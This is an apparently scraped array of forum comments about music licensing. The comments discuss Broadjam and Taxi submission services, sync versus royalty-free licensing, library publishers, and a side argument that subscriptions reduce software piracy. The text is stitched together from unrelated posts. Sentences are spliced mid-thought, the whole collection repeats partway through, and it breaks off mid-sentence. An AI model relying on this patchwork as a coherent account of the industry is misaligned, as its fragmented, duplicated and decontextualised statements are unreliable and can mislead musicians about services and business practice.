      "[\"Sync Licensing vs. Royalty Free - knowing which one to use for different clients?: Hey y'all - I was wondering about this because I have been getting some requests about licensing my music for ads among other things. I don't really know what to research or where to start.  From my basic understanding, royalty free is a one-time purchase whereas sync licensing is where you continue to make royalties from it. My music is on Pond5 for royalty free licensing, but I also pitch my music to sync licensing through Broadjam (some of my songs are in one of the libraries I pitched to).  I usually direct anyone asking for my music to simply purchase from Pond5. But lately I've been wondering if this is a bad approach...Sync licensing seems much more lucrative, and also more official/professional.  BUT it also feels like directing them to pay for sync licensing would be cheating them from the one time payment option I already have in place on Pond5. So basically, what I'm wondering is  1. Should I even offer royalty free licensing in the first place? 2. Where do you even direct a client for sync licensing? (My music is on BMI.) 3. In what case would you discuss sync licensing vs. royalty free licensing? 4. Are there people who specialize in helping indie musicians with this side of the business? It's just so confusing. Thanks for any of your help. I just feel like I need guidance, but I don't know what to look for!\", 'Robyn Adams\\' voice and lyrics are phenomenal!:  &x200B; Just have a listen and you\\'ll be blown away by Robyn Adams\\' insightful lyrics, authenticity; and sweet and soulful voice.

For those unaware the sites Taxi Some of the largest players in this will break TOS as well, and deny you, to then hit you up for paid mentorship. Nothing is ever done, as these are some of the biggest names on the platforms that reel in the most fish. The biggest problem is there is no consistency. You could see a Netflix show needs male country songs, in an old school Johnny Cash, Colter Wall, or Zack Bryan style. Acoustic, live, intimate. To then see the approved song being a female mid 2000s Bonnie Summerville sounding bubble gum pop track. You can submit for an EDM opportunity that showcases Skrillex as an example, and they will deny your 2011 styled Dubstep for something more like Avicii. (Two very different sounds) Basically, it\\'s the wild west, and the opportunity can be whatever the person requesting it wants. They will not refund over this. Ironically, if you send something opposite of what\\'s asked for, a provider can blacklist submissions from that account, and often will. \"Please read the description before wasting time and money in submission.\" Most of these \"ears of power\" as I call them are also insane. In this Taxi music podcast( you can hear the CEO of a film sync library make absurd demands that will \"end your career.\" I think this is important as it showcases the madness of the industry, and how these sites consider this stuff normal. Basically, some hot shot music library ceo says if you email him on the weekend, it\\'s unprofessional, and it may get you blacklisted. He says he doesn\\'t want to be bothered by emails on the weekend, I suppose, when he takes time, to, check his emails...on...the weekend? Yikes. Basically, do they do what they say? Yes. Some of the few wins I had led to a full time career in music without social media. However, you need to be careful. This is not posting to youtube. This is a completely different game, and you need to learn how to play it. They will not teach you. Ya gotta figure it out on your own. I recommend making a dummy account. Use Privacy payment masking, give it a go, and use what you learn with your own music. Make some tracks as a test. Hire someone. I don\\'t care.

I get sad when I look at old websites from that era, like this mask manufacturer from the 90s Or this page where a musical artist I really like posted his first ever songs in the early 2000s    Also I cry when I read an internent comment from that era.  Like the comments on the Broadjam profile say \"I like your songs\" and then it says \"more than 30 days ago\" above it.

On Bigger Licensing Deals One of the most sought-after deals is to be represented by a big licensing company like Bank Robber Music or Ocean Park Music Group. Most of these deals are made by having the right team on your side and being associated one of the label, management or legal teams these licensing companies work with. Instead of soliciting to a big licensing company with your music, work hard on attracting a great team to your music. It will be much easier to get in their door. There are many smaller licensing firms who will make small, non-exclusive deals with you and submit you for placements with music supervisors. Many of these contracts are easy to negotiate and very standard. These smaller licensing companies can often be the start to a relationship that will take you to a larger music licensing deal and more placements. Don’t be close-minded to smaller licensing deals. They can be the first step to bigger things. ', 'Question for Any of you: Hey, so an Artist i listen to had certain songs uploaded to a website named \"Broadjam\" back in the early 2000\\'s before Youtube, this was before he was known and just something he did to get noticed, He is a Singer/Rapper/Producer/ engineer ect he has a Platinum Plaque, he does everything. And i was just wondering, do u think that he kept the stems to the songs? i mean he does not strike me as the type or person to just delete shit like that, but in 2011 he made a mixtape of songs for his fans because the label he was on was not letting him release music at  the current time, so he just put some old unreleased songs onto it, and he put maybe 1 or 2 of those old songs i\\'ve mentioned earlier, but the files where in such shit quality, almost as if he just found any copy he could of the songs because he did not have ANY of the stems to re-master them or even any original Wavs. It just bothers me, he never really talks about those songs, but they were great, and i\\'ve always wanted to have the Instrumentals or any stems, he self released them back then before he was known so he still has every right to them. So just of what i have told you about this artist do u think he still has all his stems from his old stuff? and how do i ask him to listen to it, i want to ask him to buy them from him for like $4000 or something stupid so he would actually consider, but i dont want to sound like i want to buy the rights, i just want to listen to the files', 'Seeking guidance on Music Licensing and placements: Good evening, i\\'ve combed this page a few times for great threads and finally worked up the courage to make an account to seek guidance as i\\'ve read alot of great insight here but nothing that realllllly hit what i wanted to know.

Getty images music seems like a ripoff and a half simply because they KNOW they have what seems to be the most success stories with placements I\\'ve had music dealers for over a year and havent heard a peep (i mean maybe our music is just horrible but 3 artist with 10 - 15 songs each and not even a single email in 14 months?) Im not looking for an easy answer or a singular one I just want to hear from people more experienced than myself what companies are good to start getting a feel for procuring song placements, i would love a sync licensing equivalent to \"distrokid\" but the dragonballs can only be gathered once a year, im cool with the non exclusivev 50/50 models as i want to use them not so much for the money but the exposure, i\\'d gladly use my own music to test the waters but i need to be pointed in the right direction firsr or atleast tips on how to work music dealers a bit more in my favor I heard music xray and broadjam were scams as opportunity listings but havent heard any reviews on songtradr as well.', 'Just 30 Days Left Songdoor 2014 International Songwriting Competition Ends November 15: SongDoor 2014 entries must be submitted online by 1159pm CST, November 15.

Companies soon realized that subscription based services had better offer more value and incentive over the pirated options other than legality if they were to be successful and used this study to do just that.  This also led to a wide variety of monetization and DRM methods that would either succeed or fail based on the markets acceptance.  Bad DRM practices have arguably hurt the industry far worse than subscriptions ever did or will in the future. A nice benefit of cloud based models means less DRM hoops to jump through (provided the cloud doesn\\'t go down which is a legitimate concern) The ability of the IT world to reverse this trend has been quite remarkable and implementing cloud based subscriptions was not only a good way to put up roadblocks to piracy in the corporate world but was found to be an effective method of getting people to pay for the bug fixes and firmware patches that followed leading to less breaches in security for both the software developers and the end users.  Those that can afford to pay get added security and those that don\\'t and circumvent piracy protections get crippled software and no support.  How many cracked versions of the recent creative cloud or office 365 versions do you see out there?  How about working Autocad cracks?  Most recent torrent listings I can see only go up to Autocad2018 shortly after going sub based that same year.  Torrent searches for recent office 365 only net ebooks teaching it, no downloadable versions exist from what I can see.  Your \"proof\" that it doesn\\'t work because audio companies have been loath to adopt it is laughable here.  It has proven it does work extremely well when implemented to the fullest extent over a cloud based system.  The user base needs to be properly incentivized to do it right though.  Oh I also decided to ring up an old high school acquaintance that still thinks pirating software is the best thing ever. I asked him about the recent Photoshop 2019/2020/2021 torrent and if they worked and he was able to successfully crack them.  He told me that most of them are quite unstable and he has been sticking with CS6 as he can\\'t reliably use or trust the newer Adobe torrents.  The cracks either work temporarily or crash constantly. so while it is still feasibly possible to acquire and crack photoshop. the benefits these days do not seem to be worth the headaches and most people are sticking much older models, he also made specific mention of seeing significantly less software than there used to be, seems music, movies, and gaming still are the most widely available content these days. Those mediums do not benefit from the same protections with subscriptions that software can benefit from as they are much smaller package and don\\'t need programming expertise to crack.  And forum posts I perused on this topic seem to not say much past 2015 for successful photoshop cracks.  The low seed rate for the most recent versions also lend credence to lower pirating efforts for newer versions versus the CS6 and CC2015 torrents. . Seems they may have actually reduced a fair number of people pirating from what I can tell.  Only the die hards seem to be still working at it.  But the Sub model has made it far less attractive for them to do so it  seems.  More People seem fairly content to download the sub model based on is fairly low cost compared to older method of higher priced software with high priced updates. > And this shows what? That they\\'re still being pirated even though some introduced the subscription model that you said is a response to the pirating? Ignoring that strange logic, this is about audio software and the only one on that list that is in that category hasn\\'t moved to subscription-only and unless I\\'m missing something, only offers fixed pricing. Did they not get your memo? See above AutoCAD, Office 365 seem to to have little to no recent torrents out there (I am admittingly pretty far removed these days from the pirating scene and have been for quite some time, I just may not know where to look these days) And the reliability of Adobe cracks seem to be quite the minefield, I won\\'t entirely discount the ability of hackers as they have always proven to be remarkably adept in the is area.  But it does appear the pool of willing crackers looking for these titles is down quite significantly. If(when really) audio companies required even more reliance on cloud based solutions from their user bases then yes you would see piracy rates drop  this article details Adobes success in this arena  and while Adobe still holds a crown per the article it does go on to provide this statement *\"Fast forward to 2014, Adobe confirmed that the strategy had worked favorably for the multinational computer software company and also affirmed that piracy levels had come down from previous years. adobe-software-application Adobe products have been the subject of large-scale piracy since the beginning. In 2015, Adobe had another reason to celebrate when it noted that the casual piracy community had moved away from pirating Adobe products and instead was starting to shift towards buying authentic Adobe software application products because of the low priced plans. And it looks like the computer software applications company is all set to continue its auspicious streak as Adobe announced some great news for the shareholders of the Adobe community. It was revealed that Adobe was able to generate revenues in excess of $1.46 billion and that was just for the third quarter of the year. Moreover, the $1.46 billion revenue figure was a significant increase from the $1.22 billion year-on-year figure.\"* Seems to be working just fine and is incredibly successful, oh and hey they are also updating more frequently now and so is AVID.  Must be a total failure though listening to you. The part you are missing here is that piracy played a key role in the formation of subscriptions.  And if you see my edit on my previous post I am actually good friends with Roy the person who Co-owned and operated sonic foundry (the original owner of Vegas prior to Sony.  He directly relates how piracy was the deathknell for SF.  Vegas did indeed stay non subscription based and lost so much fighting piracy with ACID, and Magix/Vegas that they had to sell the company to Sony.  Roy now owns and operates Broadjam which tada is a subscription based service, showing that he learned his lessons that hard way.  And at the time Sonic foundry was on the top of their game.  ACID and vegas were both extremely popular at the time.  Where has development led now that sony at the helm?  I know of a small handful of dedicated users but market adoption certainly isn\\'t their strong point.  Seems their model is being solely propped up by the fact that Sony has deep pockets.  Indeed the latest version of Vegas Pro 18 has been lauded to be extremely unstable.  Maybe they should get the memo as it certainly appears that they did not.  Shame too as Vegas was a great piece of software back in the day.  Seems your example falls apart quite quickly when under scrutiny and would have indeed benefitted under a sub model as the owner directly looks back on.', \"That's a good question. I write 90-120 second cues for the most part. When I finish a piece it's generally in the morning when I'm fresh and feeling most creative. In the afternoon I'll look for a new idea and start putting the pieces together so it's ready to go the next morning.

I really appreciate that.  Thanks for taking time to listen through them.  Always great to share. This is just stuff I stumbled upon over the years.  Some of it was discovered by sifting through tracks from music sites like SoundClick (early/mid 2000's), BroadJam (late 2000's) and later on via YouTube music videos (Second Dan, Electric Mantra, Cary Judd).  There was some crap to dig through of course, but I feel it was definitely worth it. Actually, I just started a new subreddit last night to post radio airchecks (recordings of radio stations past and present) as well as other broadcast related stuff.  I think I'm also going to include album recommendations over there.  Rather than start another group for that, I'll just merge both ideas for now.  Not sure how well things will go, but since it's a new subreddit I say why not give it a shot.  Feel free to join me there if you'd like.  /r/LifeIsARock . Enjoy the music.  )\", 'Lol wikipedia answer has the basics. Here is my take Broadjam allows you to post your songs for free, in MP3 format only. The interface is not optimal, like something from 20 years ago. There are no or at least very few pro acts on it. And although all genres are welcome, there’s much less hip hop/rap. The demo of account holders skews older. Broadjam like other sites wants you to pay for premier level. They also have endless contests with entry fees.  The main thing is, you can review other people’s tracks, and vice versa (if you opt to make your stuff available for review). Ive had some lazy even nasty reviews and some favorable, even highly complimentary ones. So Broadjam becomes almost like Facebook meets Spotify, on a very low level.  I wouldn’t necessarily recommend Broadjam, but it has points in its favor. Worth a look, I’d say.', \"Broadjam is a US-based music community website, founded in September 1999. The service is aimed primarily at independent musicians. More details here   *This comment was left automatically (by a bot). If something's wrong, please, report it.* *Really hope this was useful and relevant D* *If I don't get this right, don't get mad at me, I'm still learning!*\", \"I am in exactly that position and I am posting my stuff, mostly on SoundCloud, some on Broadjam, and I put some stuff on BandCamp but haven't found that site to be as active, for me at least. I do everything, first on GarageBand and now Logic Pro. I'm an adequate musician, poor singer, unskilled engineer/mixer. But I'm all I got! Some tracks are not good even to me, some are decent, some I'm happy with. I like seeing the songs get heard on SC, and receiving the occasional nice comment (after ignoring all the spam, which is def a problem on SC). Broadjam is...well if interested, ask and I'll spew about Broadjam.... So yeah, I'd say, put it out there. 9 out of 10 people who hear it may not like it, but that one person who would like it will never hear it if you don't post. I think that makes sense lol.\", \"It was on Broadjam. Here's the link (hope it still works) \", 'I joined Taxi and Broadjam and submit music on a regular basis. I\\'ve had a few tracks used on TV and received royalties. However, I\\'ve received a lot more rejections which certainly can be demoralizing. But the bottom line is I LOVE music and learning. For me, it was about redefining \"success\" the best advice is don\\'t give up', \"Sadly i don't think the original files exist, The origin of the songs can be traced back to Deuce's Broadjam account where he first uploaded the songs in 2001-2005  &x200B; That is pretty much the source of all the copies on the internet, you can do inspect element and download the mp3's from that website somehow so that will be the closest you can get to the original files\", 'Hey guys, allow me to shed some light on the subject. For starters I manage a music library, roughly 2000 songs. Most of my annual revenue is from sync licensing deals and youtube adrev. The other portion of my revenue comes from custom video game scores,producing sample packs, and my other company Soundtrack Loops where we sell sample packs and presets. With that said I know Roy the owner of Broadjam. Roy and I go back to the Sonic Foundry days (original ACID, Sound Forge, Vegas, etc). We worked there and he was the VP of marketing. Anyway long story short we both parted with SF and started our own businesses. Roy started Broadjam. My companies have been a partner of the site for many years but I personally have no experience with Broadjam and sync deals. Most of my placements come from a company called APM in Hollywood and they got me in the Universal production music library so I get several hundred synchs every year. I also have music with 5 Alarm, eOne, Spirit,Nightingale Music (Canada) and Getty to name a few. NONE of those companies charge me for an \"opportunity\" and they are actively pitching my music to networks daily. They do take a cut of the publishing back end and a cut of the synch fee but I get 100% writers shares and 100% mechanicals. Personally I don\\'t recommend using any of those types of pay to submit type services. For shits and giggles I threw my non-exclusive library up on Songtradr when they were in beta and the founder hooked me up with unlimited credits. That was years ago and since I\\'ve made roughly $150 from that site. I personally don\\'t recommend Songtradr or any of those types of micro sync pay to play type services. You just don\\'t get that personal touch and who knows if they\\'re actually even listening to your submissions. Try to get your library with a reputable publisher / library agent like APM, Universal, 5 Alarm, Killer Tracks, Megatrax, Red Bull, Spirit, BMG, etc as they are the real deal IMO. This is my 2 cents so to speak I\\'ve been in this music library biz since 2009. Save your money for building your library and building your brand. Use some of that money to go to some tradeshows for networking like NAB in Vegas for example. The PMC in LA is great too (production music conference) I landed a publishing deal there that paid for my entry fee and then some within the first year by getting some of my tracks in the TV show Catfish on MTV which is STILL paying me a nice chunk of cheddar.', 'Great lineage for that here in Madison, ESPECIALLY with Sonic Foundry being from here. Look up Roy Elkins from Broadjam - he’s a real synth geek!', \"I can't find any info that says he is. Nothing on midi.org, and nothing about Dave Smith that specifically states he's involved (wiki, forums, etc.). From www.midi.org/about TMA's Advisory Board * Craig Anderton, Editor in Chief at Harmony Central * Athan Billias, Director of Strategic Product Planning at Yamaha * Roy Elkins, CEO at Broadjam * Gene Joly, Vice President of Professional Audio at QSC and past NAMM Board member * Daniel Keller, CEO, Get It In Writing media relations * Kevin LaManna, Principal at the digital marketing agency Monday Loves You * Lawrence Levine, Principal at Comet Capital * Gerson Rosenbloom, Vice President of Strategic Management at Sweetwater and former NAMM Chairman.

I'm a full time producer and composer with over 20 years in the industry.  The online culture is really toxic whether its stuff like this here, the song contests on Broadjam or Taxi, the Producer groups on FB etc.  Very few professionals are out there sharing music online for feedback, and even less are doing so with unfinished material. That is counterproductive at best and totally self defeating. As a composer and producer, I put out music for sync (tv/film licensing) primarily, under about 5 different names. The only thing that ties my real name to the material is the fact that I am the point of contact for the publishing company that administers the works of all my alteregos, and that my name is on the split sheets of any collabs I do (very few) If you want to hear my work and the work of others like me, get off soundcloud and youtube and start looking at publishing libraries, sync catalogs and independent publishing syndicators. Read tv and film credits and look up the publishing companies and music department listings. I spend time browsing most of the subs that focus on genres or styles I like, partly to keep an ear to the ground as to what styles are growing/fading etc and what folks are talking about.  I don't work too much in hip-hop or beatmaking focused genres, although I have both ghosted some tracks for fairly well known artists and produced/engineered sessions with a few artists you know, im sure. The culture really glorifies the self made producers like Dre or Ye or what have you but a lot of the producers that I encounter that focus on slinging beats and looking to make a name are too concerned about their persona and self promotion and attaching themselves to the right crew or label. And their music suffers as a result, because they are busy trying to impress and chasing styles instead of developing a voice of their own and just networking.  It's different in other genres, but not better or worse really.  Electronic music is just as bad in different ways - style purists and the hardware vs software fanatics suck.  Rock and pop are filled with their own flavors of big heads and loudmouth bedroom engineers. Cinematic types of styles are full of classically trained purists vs kitchen sink type modern aesthetics.  Basically, its all a giant shitshow full of people trying to impress and others trying to tear down because of their own fears and personality issues.  It doesn't mean a thing except to give you a benchmark of what you need to rise above. Make the best beats you can, make as much new and different stuff as possible. Grow big ears and take from every genre possible. Steal like an artist and learn to take it all in and turn it into something unique and creatively you.  And don't give up. Learn how copyright and publishing really works, study the music business in general (not just your style) and learn to network in the real world.  Online and social media is one tiny piece of the puzzle with less overall impact on the day to day than you would think. If you sell a beat, get a track optioned by a dj label, or score a juicy sync placement congrats! Now the marketing and social is their problem and they have pros and interns and budgets. Get back in the studio and worry about your music instead.   More people know me online as a guy who makes production videos and courses than as a composer or engineer and that's just the way I like it.  If you check my post history you'll see its 95% helping others troubleshoot problems or explaining stuff to newer or inexperienced users.  That's the way it should be, in my mind. Accept help and mentoring on the way up, and make your own knowledge available to the next generation as they develop.  Be the mentor you needed when you were coming up.\", '**Michael Bell**    artist pic in the UK 2004 International Songwriting Contest.

On Bigger Licensing Deals One of the most sought-after deals is to be represented by a big licensing company like Bank Robber Music or Ocean Park Music Group. Most of these deals are made by having the right team on your side and being associated one of the label, management or legal teams these licensing companies work with. Instead of soliciting to a big licensing company with your music, work hard on attracting a great team to your music. It will be much easier to get in their door.  There are many smaller licensing rms who will make small, non-exclusive deals with you and submit you for placements with music supervisors. Many of these contracts are easy to negotiate and very standard. These smaller licensing companies can often be the start to a relationship that will take you to a larger music licensing deal and more placements. Don’t be close-minded to smaller licensing deals.

This is just great. ) You have a ton of talent!!! I really enjoy your songs. You playing is very clean and your voice has a very happy tone to it. I can't help but think that your voice also has the kind of projection and clarity that would do well in a musical in the Broadway stage - have you ever done any musical theater?  I also really like the subtle touch of reverb on the recording, it gives a bit of space and resonates nicely without sounding like you are in a tunnel or swimming in an echo chamber (like many self-produced recordings of others that I have heard), so I have to ask what reverb or other effects did you use? I am planning to record and release my own songs sometime this year, how do you feel about bandcamp? I am also looking at CDBaby, iTunes, TuneCore, Amazon, Broadjam, DiscMakers but not sure which one to use - any thoughts would be appreciated.

I had a placement agent that I knew though friends and he really pushed for me. He's since moved on to other business, so he's not actively placing stuff anymore.\", 'Finding good collaborators is no easy task. You just have to put yourself out there and be willing to deal with disappointments. I prefer the real life meetings, go to open mics, etc. But people have luck with online stuff too. Its no different than making friends or dating. You try to get to know other musicians, and you\\'ll click with some of them. The creative process usually went like this I have an instrumental, they would write lyrics to the instrumental. We\\'d tweak the instrumental to fully support the lyrics and vocals, then record. I\\'d submit the fully produced track to a service like TAXI or Broadjam. If they were interested, they\\'d want an instrumental version of the song, a \"clean\" version of the song (no swears), and the original version of the song. They\\'d place a lot of instrumentals as underscore, but occasionally a full song would be used as well.', 'I\\'m feeling addled at the moment, but just quickly I was only a member of Taxi for a year... and i started off strong.  Pop placements mostly.  One of them led to an ongoing relationship with an agent in L.A.  Being from a small town in Canada, that was exciting at the time haha.  I still work with him now after several years... I\\'m much more a songwriter, and I only learned production as a way to get those songs across.  I\\'m still learning, but I\\'ve gotten much better...  What I was submitting definitely didn\\'t have that professional \"sheen\" that it should have had.  The strength of the songs was always there though, and that pushed me through I suppose.  A strong song can push through a sub-par mix, but it shouldn\\'t have to.  Even the most experienced listener/reviewer is going to be subconsciously affected by the level of production.   Money was not decent!  I don\\'t money will ever be decent again in music, actually.  That\\'s said from limited experience, but it\\'s my gut feeling.  With Broadjam, I won a competition to have a song placed in Dance Dance Revolution on XBOX360.  That was pretty cool and there was a nice one-time payment for it.  All my other placements were with Taxi though.  I can pm you some links to songs that did well if you\\'re curious.

Got a few placements from them. If I was doing song writing, I might be tempted to go back to Taxi. I was pitching produced artists at the time. It was nice that they gave me real detailed feedback from a professional musical human.\", \"What's your opinion of Amazon Studios? I'm suspicious it's a big publicity stunt. That they have a stable of writers already and these writers submit as normal users. So when they produce their stuff, Amazon will make it a big thing like they picked some Joe Unconnected off of the Internet and get lots of media coverage for their projects. Edit I just realized this may sound sarcastic, but it's a legitimate question. I'm jaded from my experiences. Amazon Studios *could* be something like the Steam Workshop, but most companies aren't as forward thinking as Valve. I'm also dubious of The Black List being a route anywhere because I don't know if any producers are actually using it to find things to make. From what I've heard, it's writers reading other writers' works and sounds like the old garage band website Broadjam. So I'm inclined to believe what you wrote in the OP.\", \"Hey man, good lookin' out, thank you!  I have a solid background in mixing and mastering and I've also found sync points to be a really crucial part of the process.  Extending or truncating cadences have been a part of my 'bread and butter' as a composer.  His novelty aside, Phillip Glass.  'nuff said 'bout that.  Matching that stuff up to sync points is a harder story. Now, what is a streamer and punch?  Personal recommendations on some good indie-style scores?  I write cinematic tunes, but rarely for anything cinematic.  I'm looking at doing lot's of short indie films and documentaries with a couple of other folks, but, I think you're right in that video games are what I should shoot for.  I used 'broadjam' for a while a number of years ago, but it's really a bit of a sham, especially nowadays with places like reddit, craigslist and musician-classifieds.  For film scoring, I'm trying to find the proverbial valve of demand to supply some tracks to.  Reddit seems to be a solid place to do some networking (my first day here) and community outreach stuff? Good advice Mr(s). Hollywood Pro, thanks for the response! Just found this -- seems to be a good spot.   \", 'Broadjam, Reverbnation, and Modern Beats Song Submit all ask for beats constantly for TV and film. This is a great way to gauge the quality of your work and if your good enough, you will get hooked up with placement agencies and start making money. Then you need to get some MCs on your tracks. Its their job to promote themselves and their music. That means you get promoted through their success and effort. So put it out there.', 'I used RN for a couple years, can\\'t recommend it -- opportunities are actually scarce and not on your terms.  They\\'re just selling your dream back to you like Broadjam.   If you want to connect with artists in your community, go to shows.

If you want a place to host your music, embed players, sell downloads, get usable statistics, sell merch, etc. -- Bandcamp.  I absolutely love BC.

      "[\"Sync Licensing vs. Royalty Free - knowing which one to use for different clients?: Hey y'all - I was wondering about this because I have been getting some requests about licensing my music for ads among other things. I don't really know what to research or where to start.  From my basic understanding, royalty free is a one-time purchase whereas sync licensing is where you continue to make royalties from it. My music is on Pond5 for royalty free licensing, but I also pitch my music to sync licensing through Broadjam (some of my songs are in one of the libraries I pitched to).  I usually direct anyone asking for my music to simply purchase from Pond5. But lately I've been wondering if this is a bad approach...Sync licensing seems much more lucrative, and also more official/professional.  BUT it also feels like directing them to pay for sync licensing would be cheating them from the one time payment option I already have in place on Pond5. So basically, what I'm wondering is  1. Should I even offer royalty free licensing in the first place? 2. Where do you even direct a client for sync licensing? (My music is on BMI.) 3. In what case would you discuss sync licensing vs. royalty free licensing? 4. Are there people who specialize in helping indie musicians with this side of the business? It's just so confusing. Thanks for any of your help. I just feel like I need guidance, but I don't know what to look for!\", 'Robyn Adams\\' voice and lyrics are phenomenal!:  &x200B; Just have a listen and you\\'ll be blown away by Robyn Adams\\' insightful lyrics, authenticity; and sweet and soulful voice.

For those unaware the sites Taxi Some of the largest players in this will break TOS as well, and deny you, to then hit you up for paid mentorship. Nothing is ever done, as these are some of the biggest names on the platforms that reel in the most fish. The biggest problem is there is no consistency. You could see a Netflix show needs male country songs, in an old school Johnny Cash, Colter Wall, or Zack Bryan style. Acoustic, live, intimate. To then see the approved song being a female mid 2000s Bonnie Summerville sounding bubble gum pop track. You can submit for an EDM opportunity that showcases Skrillex as an example, and they will deny your 2011 styled Dubstep for something more like Avicii.

Ironically, if you send something opposite of what\\'s asked for, a provider can blacklist submissions from that account, and often will. \"Please read the description before wasting time and money in submission.\" Most of these \"ears of power\" as I call them are also insane. In this Taxi music podcast( you can hear the CEO of a film sync library make absurd demands that will \"end your career.\" I think this is important as it showcases the madness of the industry, and how these sites consider this stuff normal. Basically, some hot shot music library ceo says if you email him on the weekend, it\\'s unprofessional, and it may get you blacklisted. He says he doesn\\'t want to be bothered by emails on the weekend, I suppose, when he takes time, to, check his emails...on...the weekend? Yikes. Basically, do they do what they say? Yes.

This is a completely different game, and you need to learn how to play it. They will not teach you. Ya gotta figure it out on your own. I recommend making a dummy account.

On Bigger Licensing Deals One of the most sought-after deals is to be represented by a big licensing company like Bank Robber Music or Ocean Park Music Group.

Instead of soliciting to a big licensing company with your music, work hard on attracting a great team to your music. It will be much easier to get in their door. There are many smaller licensing firms who will make small, non-exclusive deals with you and submit you for placements with music supervisors. Many of these contracts are easy to negotiate and very standard. These smaller licensing companies can often be the start to a relationship that will take you to a larger music licensing deal and more placements. Don’t be close-minded to smaller licensing deals. They can be the first step to bigger things. ', 'Question for Any of you: Hey, so an Artist i listen to had certain songs uploaded to a website named \"Broadjam\" back in the early 2000\\'s before Youtube, this was before he was known and just something he did to get noticed, He is a Singer/Rapper/Producer/ engineer ect he has a Platinum Plaque, he does everything. And i was just wondering, do u think that he kept the stems to the songs? i mean he does not strike me as the type or person to just delete shit like that, but in 2011 he made a mixtape of songs for his fans because the label he was on was not letting him release music at  the current time, so he just put some old unreleased songs onto it, and he put maybe 1 or 2 of those old songs i\\'ve mentioned earlier, but the files where in such shit quality, almost as if he just found any copy he could of the songs because he did not have ANY of the stems to re-master them or even any original Wavs. It just bothers me, he never really talks about those songs, but they were great, and i\\'ve always wanted to have the Instrumentals or any stems, he self released them back then before he was known so he still has every right to them. So just of what i have told you about this artist do u think he still has all his stems from his old stuff? and how do i ask him to listen to it, i want to ask him to buy them from him for like $4000 or something stupid so he would actually consider, but i dont want to sound like i want to buy the rights, i just want to listen to the files', 'Seeking guidance on Music Licensing and placements: Good evening, i\\'ve combed this page a few times for great threads and finally worked up the courage to make an account to seek guidance as i\\'ve read alot of great insight here but nothing that realllllly hit what i wanted to know. Basically, i run an indie label of my own and while we\\'ve made some great strides over the years i want to break into more streams of income and promotion now that i finally feel my team is ready to take on more, i would like to get a better grasp on whats currently \"working\" in terms of music licensing and song placements Cdbaby Licensing with rumblefish sounded o.k  but i do distribution with distrokid quite happily and i cant tap into their licensing services without uploading music on cdbaby for what i feel is a inefficient price model for how i run my business and using both would in the long just be extra expense just for a micro-licensing deal (unless i hear that deal is worth it). Getty images music seems like a ripoff and a half simply because they KNOW they have what seems to be the most success stories with placements I\\'ve had music dealers for over a year and havent heard a peep (i mean maybe our music is just horrible but 3 artist with 10 - 15 songs each and not even a single email in 14 months?) Im not looking for an easy answer or a singular one I just want to hear from people more experienced than myself what companies are good to start getting a feel for procuring song placements, i would love a sync licensing equivalent to \"distrokid\" but the dragonballs can only be gathered once a year, im cool with the non exclusivev 50/50 models as i want to use them not so much for the money but the exposure, i\\'d gladly use my own music to test the waters but i need to be pointed in the right direction firsr or atleast tips on how to work music dealers a bit more in my favor I heard music xray and broadjam were scams as opportunity listings but havent heard any reviews on songtradr as well.', 'Just 30 Days Left Songdoor 2014 International Songwriting Competition Ends November 15: SongDoor 2014 entries must be submitted online by 1159pm CST, November 15.

Companies soon realized that subscription based services had better offer more value and incentive over the pirated options other than legality if they were to be successful and used this study to do just that.  This also led to a wide variety of monetization and DRM methods that would either succeed or fail based on the markets acceptance.  Bad DRM practices have arguably hurt the industry far worse than subscriptions ever did or will in the future. A nice benefit of cloud based models means less DRM hoops to jump through (provided the cloud doesn\\'t go down which is a legitimate concern) The ability of the IT world to reverse this trend has been quite remarkable and implementing cloud based subscriptions was not only a good way to put up roadblocks to piracy in the corporate world but was found to be an effective method of getting people to pay for the bug fixes and firmware patches that followed leading to less breaches in security for both the software developers and the end users.  Those that can afford to pay get added security and those that don\\'t and circumvent piracy protections get crippled software and no support.  How many cracked versions of the recent creative cloud or office 365 versions do you see out there?  How about working Autocad cracks?  Most recent torrent listings I can see only go up to Autocad2018 shortly after going sub based that same year.  Torrent searches for recent office 365 only net ebooks teaching it, no downloadable versions exist from what I can see.  Your \"proof\" that it doesn\\'t work because audio companies have been loath to adopt it is laughable here.  It has proven it does work extremely well when implemented to the fullest extent over a cloud based system.  The user base needs to be properly incentivized to do it right though.  Oh I also decided to ring up an old high school acquaintance that still thinks pirating software is the best thing ever. I asked him about the recent Photoshop 2019/2020/2021 torrent and if they worked and he was able to successfully crack them.  He told me that most of them are quite unstable and he has been sticking with CS6 as he can\\'t reliably use or trust the newer Adobe torrents.  The cracks either work temporarily or crash constantly. so while it is still feasibly possible to acquire and crack photoshop. the benefits these days do not seem to be worth the headaches and most people are sticking much older models, he also made specific mention of seeing significantly less software than there used to be, seems music, movies, and gaming still are the most widely available content these days. Those mediums do not benefit from the same protections with subscriptions that software can benefit from as they are much smaller package and don\\'t need programming expertise to crack.  And forum posts I perused on this topic seem to not say much past 2015 for successful photoshop cracks.  The low seed rate for the most recent versions also lend credence to lower pirating efforts for newer versions versus the CS6 and CC2015 torrents. . Seems they may have actually reduced a fair number of people pirating from what I can tell.  Only the die hards seem to be still working at it.  But the Sub model has made it far less attractive for them to do so it  seems.  More People seem fairly content to download the sub model based on is fairly low cost compared to older method of higher priced software with high priced updates. > And this shows what? That they\\'re still being pirated even though some introduced the subscription model that you said is a response to the pirating? Ignoring that strange logic, this is about audio software and the only one on that list that is in that category hasn\\'t moved to subscription-only and unless I\\'m missing something, only offers fixed pricing. Did they not get your memo? See above AutoCAD, Office 365 seem to to have little to no recent torrents out there (I am admittingly pretty far removed these days from the pirating scene and have been for quite some time, I just may not know where to look these days) And the reliability of Adobe cracks seem to be quite the minefield, I won\\'t entirely discount the ability of hackers as they have always proven to be remarkably adept in the is area.  But it does appear the pool of willing crackers looking for these titles is down quite significantly. If(when really) audio companies required even more reliance on cloud based solutions from their user bases then yes you would see piracy rates drop  this article details Adobes success in this arena  and while Adobe still holds a crown per the article it does go on to provide this statement *\"Fast forward to 2014, Adobe confirmed that the strategy had worked favorably for the multinational computer software company and also affirmed that piracy levels had come down from previous years. adobe-software-application Adobe products have been the subject of large-scale piracy since the beginning. In 2015, Adobe had another reason to celebrate when it noted that the casual piracy community had moved away from pirating Adobe products and instead was starting to shift towards buying authentic Adobe software application products because of the low priced plans. And it looks like the computer software applications company is all set to continue its auspicious streak as Adobe announced some great news for the shareholders of the Adobe community. It was revealed that Adobe was able to generate revenues in excess of $1.46 billion and that was just for the third quarter of the year. Moreover, the $1.46 billion revenue figure was a significant increase from the $1.22 billion year-on-year figure.\"* Seems to be working just fine and is 